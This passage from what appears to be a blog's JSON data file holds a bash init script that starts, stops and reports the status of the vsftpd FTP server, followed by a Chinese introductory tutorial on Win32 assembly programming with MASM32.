&nbsp;</p><p>ftpconf=/etc/vsftpd/vsftpd.conf</p><p>prog=vsftpd</p><p>RETVAL=0</p><p>start() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -n &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$prog: already running&quot; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Starting $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; base=$prog</p><p>&nbsp; &nbsp; &nbsp; &nbsp; $vsftpd $ftpconf&amp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETVAL=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ] &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup failure&quot;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup success&quot; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return $RETVAL</p><p>}</p><p>&nbsp;</p><p>stop() {</p><p>if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>then</p><p>RETVAL=1</p><p>fi</p><p>if [ $RETVAL -ne 0 ]</p><p>then</p><p>echo &quot;vsftpd no have run&quot;</p><p>else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Stopping $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; killall $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown failure&quot; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown success&quot; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>fi</p><p>}</p><p>&nbsp;</p><p>case &quot;$1&quot; in</p><p>start)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>stop)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>status)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; status $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$? &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>restart)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>*)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Usage: $prog {start|stop|restart|status}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; exit 1</p><p>esac</p><p>exit $RETVAL</p><br /><p></p>","slug":"vsftpd-服务脚本","published":1,"updated":"2023-04-22T05:38:44.927Z","_id":"clgrjlxkb008n7opi91nahzik","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&nbsp;</p><p>#!/bin/bash</p><p>#by:key1088</p><p>#description:vsftpd</p><p>#conf:/etc/vsftpd/vsftp.conf</p><p>#cp vsftpd &nbsp;/etc/init.d/vsftpd</p><p>#chmod 755 /etc/init.d/vsftpd</p><p>#chkconfig --add vsftpd&nbsp;</p><p>#chkconfig vsftpd on</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ -f /etc/init.d/functions ]&nbsp;</p><p>then</p><p>. /etc/init.d/functions</p><p>elif [ -f /etc/rc.d/init.d/functions ]</p><p>then</p><p>. /etc/rc.d/init.d/functions</p><p>else</p><p>exit 0</p><p>fi</p><p>vsftpd=/usr/local/sbin/vsftpd &nbsp; &nbsp; &nbsp;</p><p>ftpconf=/etc/vsftpd/vsftpd.conf</p><p>prog=vsftpd</p><p>RETVAL=0</p><p>start() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -n &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$prog: already running&quot; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Starting $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; base=$prog</p><p>&nbsp; &nbsp; &nbsp; &nbsp; $vsftpd $ftpconf&amp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETVAL=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ] &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup failure&quot;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup success&quot; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return $RETVAL</p><p>}</p><p>&nbsp;</p><p>stop() {</p><p>if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>then</p><p>RETVAL=1</p><p>fi</p><p>if [ $RETVAL -ne 0 ]</p><p>then</p><p>echo &quot;vsftpd no have run&quot;</p><p>else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Stopping $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; killall $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown failure&quot; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown success&quot; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>fi</p><p>}</p><p>&nbsp;</p><p>case &quot;$1&quot; in</p><p>start)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>stop)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>status)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; status $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$? &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>restart)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>*)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Usage: $prog {start|stop|restart|status}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; exit 1</p><p>esac</p><p>exit $RETVAL</p><br /><p></p>","site":{"data":{}},"excerpt":"","more":"<p>&nbsp;</p><p>#!/bin/bash</p><p>#by:key1088</p><p>#description:vsftpd</p><p>#conf:/etc/vsftpd/vsftp.conf</p><p>#cp vsftpd &nbsp;/etc/init.d/vsftpd</p><p>#chmod 755 /etc/init.d/vsftpd</p><p>#chkconfig --add vsftpd&nbsp;</p><p>#chkconfig vsftpd on</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ -f /etc/init.d/functions ]&nbsp;</p><p>then</p><p>. /etc/init.d/functions</p><p>elif [ -f /etc/rc.d/init.d/functions ]</p><p>then</p><p>. /etc/rc.d/init.d/functions</p><p>else</p><p>exit 0</p><p>fi</p><p>vsftpd=/usr/local/sbin/vsftpd &nbsp; &nbsp; &nbsp;</p><p>ftpconf=/etc/vsftpd/vsftpd.conf</p><p>prog=vsftpd</p><p>RETVAL=0</p><p>start() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -n &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$prog: already running&quot; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Starting $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; base=$prog</p><p>&nbsp; &nbsp; &nbsp; &nbsp; $vsftpd $ftpconf&amp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETVAL=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ] &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup failure&quot;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup success&quot; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return $RETVAL</p><p>}</p><p>&nbsp;</p><p>stop() {</p><p>if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>then</p><p>RETVAL=1</p><p>fi</p><p>if [ $RETVAL -ne 0 ]</p><p>then</p><p>echo &quot;vsftpd no have run&quot;</p><p>else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Stopping $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; killall $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown failure&quot; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown success&quot; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>fi</p><p>}</p><p>&nbsp;</p><p>case &quot;$1&quot; in</p><p>start)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>stop)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>status)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; status $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$? &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>restart)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>*)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Usage: $prog {start|stop|restart|status}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; exit 1</p><p>esac</p><p>exit $RETVAL</p><br /><p></p>"},{"title":"win32汇编快速入门","date":"2010-04-23T05:18:00.000Z","_content":"<p>汇编可以开发WINDOWS程序？答案是肯定的，用WIN32汇编语言开发出来的WINDOWS程序具有执行效率高、占用空间小等特点。</p><strong>一、开发工具下载与安装</strong>&#160;&#160;在众多WIN32汇编开发工具中，MASM32笔者比较偏爱，它具有很多代码示例和丰富的开发资源，在下列下载地址中选择一个地址下载 MASM32。<br />http://www.pediy.com/tools/Compilers.htm<strong>二、知识预备</strong><strong>&#160;&#160;1、寄存器</strong><strong>&#160;&#160;&#160;</strong>为了提高运算速度和数据的存取速度，在计算机的CPU内，有一组硬件装置，第一个装置内存放CPU运算需要的 数，这些数值可供CPU直接存取，这组装置叫寄存器。寄存器分为通用寄存器、段寄存器、程序指针寄存器、标志寄存器。&#160;&#160;&#160;编程最常用就是通用寄存器，常用的通用寄存器有eax,ebx,ecx,edx,esi,edi等等，现代计算机的CPU一般是以32位 为单位进行运算，因此一个寄存器最大能存放32位的二进制数。每个寄存器通常都有它默认的用法，所谓默认只是一种编程的习惯，你可以不遵守这些用法，但是 有些情况下必须遵守，因为我们开发的是WINDOWS程序，要遵守WINDOWS操作系统的规定和汇编语法本身的约束，比如调用一个WINDOWSAPI 函数，返回值放在EAX，堆栈的栈顶地址在esp，在汇编语言的循环中，ECX内存放循环的次数。具体寄存器的使用会在以后介绍。<strong>&#160;&#160;2、堆栈</strong><strong>&#160;&#160;&#160;</strong>堆栈是个非常古老的概念，在DOS时代就有了，也是个非常重要的东西，程序没了它就活不了，堆栈就是在内存里分 配一个区域，使用这个区域必须遵守一个规定：后进先出，后进来的先出去，可以把它想像成一个空木箱，首先往里面放棉衣，然后往里面放书，最后放上运动服。 如果要取出书，必须得把最后放上的运动服取出，放的顺序是棉衣-&gt;书-&gt;运动服，取的顺序是运动服-&gt;书-&gt;棉衣，堆栈也是如 此。&#160;&#160;&#160;先解释一下什么是地址，内存价格的便宜和内存容量的扩大，WINDOWS虚拟内存早已出现，内存中放着众多的数据，必须要有方法表示内存 某个地点，这个地点就用地址来表示。把内存以字节为单位划分，某个地址表示某个字节的地址，如左下图是一个内有4个成员的堆栈，堆栈里的成员以一个字节为 单位（数的右边标明了以十六进制表示的地址，如1001）+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong><strong>&#160;&#160;</strong>堆栈是向下增长的，每增加一个成员，栈顶（堆栈顶部的地址）的地址减1，对于这个堆栈，栈顶地址是AF18，如果 再往这个堆栈里增加一个成员的话，它的地址是:AF18-1=AF17。如果往这个堆栈里增加一个32位的数，栈顶的地址是多少呢，32位的数占4个成员 的位置，栈顶的地址为：AF18-4=AF14。&#160;&#160;在这个堆栈中增加一个32位数DAB0CD90，新的堆栈如下：+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong>|DA|&#160;&#160; 地址:AF17+--+|B0|&#160;&#160; 地址：AF16+--+|CD|&#160;&#160; 地址：AF15+--+|90|&#160;&#160; 地址：AF14<strong>+--+&#160;</strong>&#160;&#160;&#160;如果从堆栈里拿走一个32位数，则栈顶的地址为：AF14+4=AF18三、WIN32汇编语言的语法&#160;  &#160;为了方便大家理解和入门，下面尽量使用宏汇编和伪指令地方进行描述，也正因为有了宏汇编和伪指令的帮助，WIN32汇编才具有很多高级语言的特性,很多 语法和C差不多。&#160; 1、WIN32汇编程序基本结构&#160;&#160; .386&#160;&#160; .MODEL Flat,STDCALL&#160;&#160; .DATA&#160;&#160;&#160;&#160;&#160;初始化值的全局变量定义&#160;&#160; .DATA?&#160;&#160;&#160;&#160;&#160;未初始化值的全局变量定义&#160;&#160;&#160;.CONST&#160;&#160;&#160;&#160;&#160;常量定义&#160;&#160; .CODE&#160;&#160;&#160;&#160;..............&#160;&#160;&#160;&#160;...............&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序入口LABEL&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;end程序入口LABEL2、变量定义&#160;&#160; （1）定义全局变量&#160;&#160;&#160;全局变量定义在.data和.data?内，&#160;&#160;&#160;初始化变量的定义方式如下：&#160;&#160;&#160;.data&#160;&#160;&#160;变量名&#160; 类型&#160; 初始值1,初始值2,.......&#160;&#160;&#160;变量名&#160; 类型&#160; 重复次数dup(初始值1,初始值2,....)&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:如果用?表示初始值的话,则表示0&#160;&#160;&#160;&#160;&#160;&#160;未初始化变量的定义方式是&#160;&#160;&#160;.data?&#160;&#160;&#160;&#160;变量名&#160; 类型 ?&#160;&#160;&#160;&#160;(2)条件测试语句&#160;&#160;&#160;(A)基本结构&#160;&#160;&#160; .IF条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;[.ELSEIF]条件比较&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;&#160;&#160;.......&#160;&#160;&#160;[.ELSE]&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;.ENDIF&#160;&#160;&#160;(3)操作符&#160;&#160;&#160;(A)比较操作符&#160;&#160;&#160;&#160;==&#160;相等&#160;&#160;&#160;!=&#160;&#160;不等于&#160;&#160;&#160;&gt;&#160;&#160; 大于&#160;&#160;&#160;&#160;&gt;=&#160;&#160;大于或等于&#160;&#160;&#160;&lt;&#160;&#160; 小于&#160;&#160;&#160;&#160;&lt;=&#160;&#160;小于或等于&#160;&#160;&#160;&amp;&#160;&#160; 位测试&#160;&#160;&#160;&#160;!&#160;&#160;逻辑非&#160;&#160;&#160;&amp;&amp;&#160; 逻辑与&#160;&#160;&#160;||&#160; 逻辑或&#160;&#160;&#160;(B)位操作符&#160;&#160;&#160;&#160;AND按位与&#160;&#160;&#160;OR&#160; 按位或&#160;&#160;&#160;XOR&#160;异或&#160;&#160;&#160; SHL逻辑左移&#160;&#160;&#160; SHR逻辑右移&#160;&#160;&#160;(C)标志寄存器操作符&#160;&#160;&#160; CARRY?是否进位&#160;&#160;&#160;OVERFLOW? 是否溢出&#160;&#160;&#160;PARITY?&#160; 奇偶位是否置位&#160;&#160;&#160;SIGN?&#160;&#160;&#160;符号位标志位是否被置位&#160;&#160;&#160;ZERO?&#160;&#160;&#160;零位标志位是否置位&#160;&#160; (4)循环语句&#160;&#160;(A)while语句&#160;&#160;while 条件&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;[.break[.if 退出条件]]&#160;&#160;&#160;[.contine[.if 退出条件]]]&#160;&#160;.end(B)repeat语句.repeat.....................[.break[.if 退出条件]][.contine[.if 退出条件]]].until 条件(或.untilcxz [条件])(5)子程序定义1、定义子程序名 proc [距离][语言类型][可视区域][USERS 寄存器列表][,参数:类型]...[VARARG]local  局部变量列表............................................子程序名 endp2、如果在未定义前使用，要声明、函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型,...............(6)数据结构(A)声明wndclass struct...............wndclass ends(B)定义mystruct wndclass&lt;1,1,...,1&gt;mystruct wndclass &lt;&gt;(C)使用mov eax,mystruct.lpfnwndproc&#160;mov esi,offset mystructassume esi: ptr WNDCLASSmov eax,[esi].lpfnwndproc&#160;.......assume esi:nothing四、在WIN32汇编中的使用WINDOWS API&#160;&#160;WIN32汇编如果没有API的帮助无法实现很多功能，笔者没见过在WIN32汇编程序不调用API的。&#160;&#160;调用API实际上是靠堆栈来完成参数传递的,既然是堆栈,那就要遵守后进先出的原则,这意味API的第一个参数是最后一个放入堆栈的,最后 一个参数是第一个放入堆栈的。&#160;&#160;&#160;&#160; 调用方式如下：push 参数n..........&#160;&#160;push 参数2p\nush 参数1call API函数名&#160;&#160;为了简化代码，也可以使用以下这种方式调用APIinvoke API函数名,参数1,参数2,.....,参数n","source":"_posts/win32汇编快速入门.md","raw":"title: win32汇编快速入门\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-04-23 13:18:00\n---\n<p>汇编可以开发WINDOWS程序？答案是肯定的，用WIN32汇编语言开发出来的WINDOWS程序具有执行效率高、占用空间小等特点。</p><strong>一、开发工具下载与安装</strong>&#160;&#160;在众多WIN32汇编开发工具中，MASM32笔者比较偏爱，它具有很多代码示例和丰富的开发资源，在下列下载地址中选择一个地址下载 MASM32。<br />http://www.pediy.com/tools/Compilers.htm<strong>二、知识预备</strong><strong>&#160;&#160;1、寄存器</strong><strong>&#160;&#160;&#160;</strong>为了提高运算速度和数据的存取速度，在计算机的CPU内，有一组硬件装置，第一个装置内存放CPU运算需要的 数，这些数值可供CPU直接存取，这组装置叫寄存器。寄存器分为通用寄存器、段寄存器、程序指针寄存器、标志寄存器。&#160;&#160;&#160;编程最常用就是通用寄存器，常用的通用寄存器有eax,ebx,ecx,edx,esi,edi等等，现代计算机的CPU一般是以32位 为单位进行运算，因此一个寄存器最大能存放32位的二进制数。每个寄存器通常都有它默认的用法，所谓默认只是一种编程的习惯，你可以不遵守这些用法，但是 有些情况下必须遵守，因为我们开发的是WINDOWS程序，要遵守WINDOWS操作系统的规定和汇编语法本身的约束，比如调用一个WINDOWSAPI 函数，返回值放在EAX，堆栈的栈顶地址在esp，在汇编语言的循环中，ECX内存放循环的次数。具体寄存器的使用会在以后介绍。<strong>&#160;&#160;2、堆栈</strong><strong>&#160;&#160;&#160;</strong>堆栈是个非常古老的概念，在DOS时代就有了，也是个非常重要的东西，程序没了它就活不了，堆栈就是在内存里分 配一个区域，使用这个区域必须遵守一个规定：后进先出，后进来的先出去，可以把它想像成一个空木箱，首先往里面放棉衣，然后往里面放书，最后放上运动服。 如果要取出书，必须得把最后放上的运动服取出，放的顺序是棉衣-&gt;书-&gt;运动服，取的顺序是运动服-&gt;书-&gt;棉衣，堆栈也是如 此。&#160;&#160;&#160;先解释一下什么是地址，内存价格的便宜和内存容量的扩大，WINDOWS虚拟内存早已出现，内存中放着众多的数据，必须要有方法表示内存 某个地点，这个地点就用地址来表示。把内存以字节为单位划分，某个地址表示某个字节的地址，如左下图是一个内有4个成员的堆栈，堆栈里的成员以一个字节为 单位（数的右边标明了以十六进制表示的地址，如1001）+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong><strong>&#160;&#160;</strong>堆栈是向下增长的，每增加一个成员，栈顶（堆栈顶部的地址）的地址减1，对于这个堆栈，栈顶地址是AF18，如果 再往这个堆栈里增加一个成员的话，它的地址是:AF18-1=AF17。如果往这个堆栈里增加一个32位的数，栈顶的地址是多少呢，32位的数占4个成员 的位置，栈顶的地址为：AF18-4=AF14。&#160;&#160;在这个堆栈中增加一个32位数DAB0CD90，新的堆栈如下：+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong>|DA|&#160;&#160; 地址:AF17+--+|B0|&#160;&#160; 地址：AF16+--+|CD|&#160;&#160; 地址：AF15+--+|90|&#160;&#160; 地址：AF14<strong>+--+&#160;</strong>&#160;&#160;&#160;如果从堆栈里拿走一个32位数，则栈顶的地址为：AF14+4=AF18三、WIN32汇编语言的语法&#160;  &#160;为了方便大家理解和入门，下面尽量使用宏汇编和伪指令地方进行描述，也正因为有了宏汇编和伪指令的帮助，WIN32汇编才具有很多高级语言的特性,很多 语法和C差不多。&#160; 1、WIN32汇编程序基本结构&#160;&#160; .386&#160;&#160; .MODEL Flat,STDCALL&#160;&#160; .DATA&#160;&#160;&#160;&#160;&#160;初始化值的全局变量定义&#160;&#160; .DATA?&#160;&#160;&#160;&#160;&#160;未初始化值的全局变量定义&#160;&#160;&#160;.CONST&#160;&#160;&#160;&#160;&#160;常量定义&#160;&#160; .CODE&#160;&#160;&#160;&#160;..............&#160;&#160;&#160;&#160;...............&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序入口LABEL&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;end程序入口LABEL2、变量定义&#160;&#160; （1）定义全局变量&#160;&#160;&#160;全局变量定义在.data和.data?内，&#160;&#160;&#160;初始化变量的定义方式如下：&#160;&#160;&#160;.data&#160;&#160;&#160;变量名&#160; 类型&#160; 初始值1,初始值2,.......&#160;&#160;&#160;变量名&#160; 类型&#160; 重复次数dup(初始值1,初始值2,....)&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:如果用?表示初始值的话,则表示0&#160;&#160;&#160;&#160;&#160;&#160;未初始化变量的定义方式是&#160;&#160;&#160;.data?&#160;&#160;&#160;&#160;变量名&#160; 类型 ?&#160;&#160;&#160;&#160;(2)条件测试语句&#160;&#160;&#160;(A)基本结构&#160;&#160;&#160; .IF条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;[.ELSEIF]条件比较&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;&#160;&#160;.......&#160;&#160;&#160;[.ELSE]&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;.ENDIF&#160;&#160;&#160;(3)操作符&#160;&#160;&#160;(A)比较操作符&#160;&#160;&#160;&#160;==&#160;相等&#160;&#160;&#160;!=&#160;&#160;不等于&#160;&#160;&#160;&gt;&#160;&#160; 大于&#160;&#160;&#160;&#160;&gt;=&#160;&#160;大于或等于&#160;&#160;&#160;&lt;&#160;&#160; 小于&#160;&#160;&#160;&#160;&lt;=&#160;&#160;小于或等于&#160;&#160;&#160;&amp;&#160;&#160; 位测试&#160;&#160;&#160;&#160;!&#160;&#160;逻辑非&#160;&#160;&#160;&amp;&amp;&#160; 逻辑与&#160;&#160;&#160;||&#160; 逻辑或&#160;&#160;&#160;(B)位操作符&#160;&#160;&#160;&#160;AND按位与&#160;&#160;&#160;OR&#160; 按位或&#160;&#160;&#160;XOR&#160;异或&#160;&#160;&#160; SHL逻辑左移&#160;&#160;&#160; SHR逻辑右移&#160;&#160;&#160;(C)标志寄存器操作符&#160;&#160;&#160; CARRY?是否进位&#160;&#160;&#160;OVERFLOW? 是否溢出&#160;&#160;&#160;PARITY?&#160; 奇偶位是否置位&#160;&#160;&#160;SIGN?&#160;&#160;&#160;符号位标志位是否被置位&#160;&#160;&#160;ZERO?&#160;&#160;&#160;零位标志位是否置位&#160;&#160; (4)循环语句&#160;&#160;(A)while语句&#160;&#160;while 条件&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;[.break[.if 退出条件]]&#160;&#160;&#160;[.contine[.if 退出条件]]]&#160;&#160;.end(B)repeat语句.repeat.....................[.break[.if 退出条件]][.contine[.if 退出条件]]].until 条件(或.untilcxz [条件])(5)子程序定义1、定义子程序名 proc [距离][语言类型][可视区域][USERS 寄存器列表][,参数:类型]...[VARARG]local  局部变量列表............................................子程序名 endp2、如果在未定义前使用，要声明、函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型,...............(6)数据结构(A)声明wndclass struct...............wndclass ends(B)定义mystruct wndclass&lt;1,1,...,1&gt;mystruct wndclass &lt;&gt;(C)使用mov eax,mystruct.lpfnwndproc&#160;mov esi,offset mystructassume esi: ptr WNDCLASSmov eax,[esi].lpfnwndproc&#160;.......assume esi:nothing四、在WIN32汇编中的使用WINDOWS API&#160;&#160;WIN32汇编如果没有API的帮助无法实现很多功能，笔者没见过在WIN32汇编程序不调用API的。&#160;&#160;调用API实际上是靠堆栈来完成参数传递的,既然是堆栈,那就要遵守后进先出的原则,这意味API的第一个参数是最后一个放入堆栈的,最后 一个参数是第一个放入堆栈的。&#160;&#160;&#160;&#160; 调用方式如下：push 参数n..........&#160;&#160;push 参数2p\nush 参数1call 